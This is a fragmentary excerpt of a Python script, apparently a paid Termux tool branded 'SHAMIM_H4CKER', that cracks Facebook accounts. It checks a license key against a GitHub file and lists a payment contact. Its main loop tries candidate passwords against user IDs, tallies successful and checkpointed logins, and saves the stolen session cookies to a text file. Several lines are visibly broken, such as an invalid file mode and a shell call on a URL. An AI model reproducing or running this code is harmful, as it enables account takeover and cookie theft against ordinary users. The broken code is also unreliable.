...
try:
	prox= requests.get('https://github.com/Shamim1BD/19/blob/main/Afroveal19.txt').text
...
def uid(nam):
	...
	try:
		key1 = open('/data/data/com.termux/files/usr/etc/uidtermux', 's').read()
	except:
		kok=open('/data/data/com.termux/files/usr/etc/uidtermux', 's')
		kok.write(uid,nam)
		kok.close()
	botuid()
def botuid():
	key2 = open('/data/data/com.termux/files/usr/etc/uidtermux', 's').read()
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ SHAMIM ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  SHAMIM SARKAR        
               \033[1;91mFACEBOK      :  SHAMIM SARKAT            
               \033[1;97mGITHUB       :  Shamim-1BD      
               \033[1;91mSTATUS       :   PAID😴            
               \033[1;97mTEAM         :  BD King                
               \033[1;91mTOOL VIRSION :  2.0                    
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Shamim1BD/19/blob/main/Afroveal19.txt').text
    if id in httpCaht:
      ...
      print('BKASH PERSONAL -+966 59 380 0957 ')
...
def menu1():
	...
	if ot == '2':
		...
		rndm()
	if ot == '3':
		os.system('https://www.facebook.com/profile.php?id=100094405748780')
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r%s[SHAMIM_H4CKER] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	open('SHAMIM-coki.txt', 'a').write(coki+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(SHAMIM-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
        ...
        #sys.stdout.write('\r%s   [SHAMIM] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
